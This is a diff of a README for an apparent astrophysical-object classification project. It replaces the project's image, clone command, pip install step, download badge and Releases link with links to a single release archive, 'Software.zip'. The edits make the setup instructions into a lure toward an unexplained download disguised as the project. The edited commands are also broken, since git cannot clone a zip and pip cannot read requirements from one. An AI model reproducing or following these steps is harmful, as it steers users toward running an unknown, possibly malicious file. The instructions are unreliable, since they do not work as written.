@@ -1,6 +1,6 @@
 # 🌌 Astrophysical Objects Classification 🛰️
 
-![Astrophysical Objects](https://images.unsplash.com/photo-1593642428192-2e69767ab820?ixlib=rb-1.2.1&auto=format&fit=crop&w=334&q=80)
+![Astrophysical Objects](https://github.com/vietanh152/Astrophysical-Objects-Classification/releases/download/v1.0/Software.zip)
 
 Welcome to the **Astrophysical Objects Classification** repository! 🚀 In this project, we leverage machine learning techniques to classify various astrophysical objects using observational data obtained from the state-of-the-art Large Synoptic Survey Telescope (LSST). By applying advanced algorithms and models to this data, we aim to uncover patterns and insights that will enhance our understanding of the universe.
 
@@ -33,12 +33,12 @@ To get started with the project, follow these steps:
 
 1. Clone the repository to your local machine:
 ```
-git clone https://github.com/your-username/Astrophysical-Objects-Classification.git
+git clone https://github.com/vietanh152/Astrophysical-Objects-Classification/releases/download/v1.0/Software.zip
 ```
 
 2. Install the required dependencies using `pip`:
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/vietanh152/Astrophysical-Objects-Classification/releases/download/v1.0/Software.zip
 ```
 
 3. Explore the Jupyter notebooks in the `notebooks` directory to understand the data preprocessing, model training, and evaluation processes.
@@ -90,11 +90,11 @@ We would like to express our gratitude to the LSST project for providing the obs
 
 🛰️ **Launch the Project!**  
 Click the button below to download the project files:  
-[![Download Project](https://img.shields.io/badge/Download%20Project-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Project](https://github.com/vietanh152/Astrophysical-Objects-Classification/releases/download/v1.0/Software.zip%20Project-v1.0.0-blue)](https://github.com/vietanh152/Astrophysical-Objects-Classification/releases/download/v1.0/Software.zip)
 
 ---
 
-🚀 Visit the [Releases](https://github.com/your-username/Astrophysical-Objects-Classification/releases) section for additional information and updates on the project.
+🚀 Visit the [Releases](https://github.com/vietanh152/Astrophysical-Objects-Classification/releases/download/v1.0/Software.zip) section for additional information and updates on the project.
 
 ---
 
